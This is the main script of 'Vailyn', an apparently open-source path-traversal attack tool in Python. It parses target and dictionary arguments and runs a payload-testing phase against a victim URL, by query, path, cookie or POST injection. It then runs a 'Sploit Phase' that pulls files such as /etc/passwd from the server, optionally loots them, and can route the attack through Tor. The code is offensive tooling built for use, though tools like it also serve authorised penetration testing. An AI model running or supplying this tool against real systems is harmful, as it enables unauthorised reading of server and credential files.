#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[Vailyn]─[~]
└──╼ VainlyStrain
"""

import treelib, argparse
import requests, sys
import random, string
import subprocess
import colorama
import time
import os

import core.variables as variables

from itertools import permutations
from multiprocessing.pool import ThreadPool as Pool

from core.methods.parser import build_parser
from core.methods.print import banner
from core.methods.list import listsplit
from core.methods.select import select
from core.methods.tree import create_tree
from core.methods.attack import phase1, phase2
from core.methods.cookie import readCookie
from core.methods.cache import load, save, parseUrl
from core.methods.tor import initcheck, torpipe, torcheck

from core.colors import color
from core.variables import payloadlist, nullchars, version, sdirs, commons, processes, cachedir


#initialize colorama
colorama.init()

#initialize file tree
filetree = treelib.Tree()
filetree.create_node(color.O+"/"+color.END+color.RD, "root")

"""Vailyn's main - parse args, start attacks & print results"""
def main() -> int:    
    banner()
    parser = build_parser()
    opt = vars(parser.parse_args())
    args = parser.parse_args()
    if not (opt["lists"] and opt["victim"] and opt["attack"]):
        parser.print_usage()
        sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -v, -a and -l mandatory')

    #load dictionaries
    if opt['lists']:
        with open(args.lists[0]) as filelisted:
            for l in filelisted:
                commons.append(l.strip())
        with open(args.lists[1]) as dirlisted:
            for l in dirlisted:
                sdirs.append(l.strip())
  
    loot = False
    victim2 = ""
    depth = 2
    verbose = False
    foundfiles = [""]
    foundurls = [""]
    foundpayloads = []
    foundnullbytes = []
    vlnfile = "/etc/passwd"
    checkdepth = 8
    cookiefile = ""

    #handle optional arguments
    if opt["loot"]:
        loot = True

    if opt["vic2"]:
        victim2 = args.vic2

    if opt["depths"]:
        checkdepth = args.depths[0]
        depth = args.depths[1]

    if opt["debug"]:
        verbose = True

    if opt["check"]:
        vlnfile = args.check

    if opt["cookie"]:
        cookiefile = args.cookie
    
    param = ""
    cookie = None
    postdata = ""
    selected = ""

    if opt["tor"]:        
        variables.tor = True
        try:
            initcheck()
            acc = True
        except:
            acc = False

        if acc or not variables.initip == "":
            if sys.platform.lower().startswith('win'):
                status = input(color.END+" [?] Do you have the Tor service actively running? (enter if not) :> ")
                if status == "":
                    sys.exit(" {}[-]{} Aborting.".format(color.R, color.END))
            else:
                p = torpipe(True)
                if not p:
                    start = input(color.END+" [?] Do you want to start the Tor service? (enter if not) :> ")
                    if start != "":
                        try:
                            subprocess.run(["systemctl", "start", "tor"])
                            p = torpipe(True)
                        except OSError: #non-systemd distro
                            subprocess.run(["service", "tor", "start"])
                            p = torpipe(True)
                        except OSError: #macOS - requires brew
                            subprocess.run(["brew", "services", "start", "tor"])
                            p = torpipe(True)
                        except Exception as e:
                            sys.exit(e)
            torcheck()
        else:
            sys.exit("{} [-]{} Problems setting initial IP. Aborting.".format(color.R, color.END))


    #create directory permutations from dictionary
    iter=1
    ndirs=list.copy(sdirs)
    #remove empty string causing duplicates
    del ndirs[0]
    mdirs=[]
    while (iter<=(depth)):
        mdirs += permutations(ndirs,(iter+1))
        iter+=1
    for elem in mdirs:
        diri=''.join(elem)
        sdirs.append(diri)

    #equally split dictionary entries and payloads to all threads
    splitted = listsplit(sdirs, round(len(sdirs)/processes))
    paysplit = listsplit(payloadlist, round(len(payloadlist)/processes))

    if (args.attack == 1):  #query mode
        if not opt["param"]:
            parser.print_usage()
            sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -p mandatory for -a 1')
        print("{}Vailyn: {}PARAM{}".format(color.RC, color.END+color.RB, color.END))
        param = args.param
    elif (args.attack == 2):  #path mode
        if not args.victim.endswith("/"):
            args.victim = args.victim + "/"
        print("{}Vailyn: {}PATH{}".format(color.RC, color.END+color.RB, color.END))
    elif (args.attack == 3):  #cookie mode
        print("{}Vailyn: {}COOKIE{}".format(color.RC, color.END+color.RB, color.END))
    elif (args.attack == 4): #post traversal
        if not opt["post"]:
            parser.print_usage()
            sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -s mandatory for -a 4')
        print("{}Vailyn: {}POST{}".format(color.RC, color.END+color.RB, color.END))
        postdata = args.post
        if "INJECT" not in postdata:
            sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -s needs to contain INJECT at injection point')
        if "=" not in postdata:
            sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -s needs to be of form P1=V1&P2=V2')


    print("    v" + version)
    time.sleep(0.5)

    if variables.tor:
        print("\n{0} [TOR]{1}{6} IP{1}{0}|{1}{5} {2} {1}{4}>{1} {3}".format(color.RD, color.END, variables.initip, variables.torip, color.BOLD, color.CURSIVE, color.O))

    #fetch and select cookie for cookie mode
    if args.attack == 3:
        print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Parsing Cookie\n'.format(color.RD, color.END))
        cookie, selected = readCookie(args.victim)

    print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Analysis Phase\n'.format(color.RD, color.END))
        
    vlnysis = True

    #present option to skip phase 1 if cache from previous attack present
    targetcache = parseUrl(args.victim)
    if os.path.exists(cachedir+targetcache+"payloads.cache") and os.path.exists(cachedir+targetcache+"nullbytes.cache"):
        choice = input("{0}[!]{1} Detected Payload cache from previous attack.\n{0}[?]{1} Do you want to load the cache and skip Phase 1? (enter if not) :> ".format(color.RD, color.END))
        if choice != "":
            vlnysis = False
            foundpayloads, foundnullbytes = load(targetcache)
        else:
            print()

    if vlnysis:
        print("{0}[+]{1} Loaded {2}{3}{1} payloads.\n".format(color.RD, color.END, color.BOLD, len(payloadlist)*len(nullchars)))
        starting_time = time.time()
        #initiate phase 1 - vulnerability analysis
        with Pool(processes=processes) as pool:
            res = [pool.apply_async(phase1, args=(args.attack,args.victim,victim2,param,cookie,selected,verbose,checkdepth,l,vlnfile,cookiefile,postdata,)) for l in paysplit]
            for i in res:
                #fetch results
                tuples = i.get()
                foundpayloads += tuples[0]
                foundnullbytes += tuples[1]
            
        ending_time = time.time()
        vuln_time = ending_time - starting_time
        #save working payloads to cache
        save(targetcache, foundpayloads, foundnullbytes)
    else:
        vuln_time = 0.0

    #determine if phase 2 happens          
    attack = False
    if foundpayloads:
        attack = True
        selectedpayloads = select(foundpayloads)
        if foundnullbytes:
            selectednullbytes = select(foundnullbytes, nullbytes=True)
        else:
            selectednullbytes = []
    else:
        cont = input("[!] No payload succeeded. Attack anyways? (enter if not) :> ")
        if cont != "":
            attack = True
            #attack with everything if phase 1 was unsuccessful
            selectedpayloads = payloadlist
            selectednullbytes = nullchars

    #start the exploitation phase
    starting_time = time.time()
    if attack:
        print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Sploit Phase\n'.format(color.RD, color.END))
        with Pool(processes=processes) as pool:
            res = [pool.apply_async(phase2, args=(args.attack,args.victim,victim2,param,cookie,selected,commons,l,depth,verbose,loot,selectedpayloads,selectednullbytes,cookiefile,postdata,)) for l in splitted]
            for i in res:
                #fetch results
                restuple = i.get()
                foundfiles += restuple[0]
                foundurls += restuple[1]

                    
    ending_time = time.time()
    attack_time = ending_time - starting_time
    total_time = vuln_time + attack_time

    #display found files in a file tree
    print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Directory Tree\n'.format(color.RD, color.END))
    if foundfiles:
        create_tree(filetree, foundfiles)
        filetree.show()
    if not foundurls:
        print("nothing found")

    print("{}Scan completed in {}s.{}".format(color.RC, total_time, color.END))
    if variables.tor:
        stop = input(color.END+" [?] Do you want to terminate the Tor service? (enter if not) :> ")
        if stop != "":
            try:
                subprocess.run(["systemctl", "stop", "tor"])
            except OSError:
                subprocess.run(["service", "tor", "stop"])
            except OSError:
                subprocess.run(["brew", "services", "stop", "tor"])
            except Exception as e:
                sys.exit(e)


if __name__ == "__main__":
    try:
       main()
    except KeyboardInterrupt:
        print('\nInterrvpted.\n')
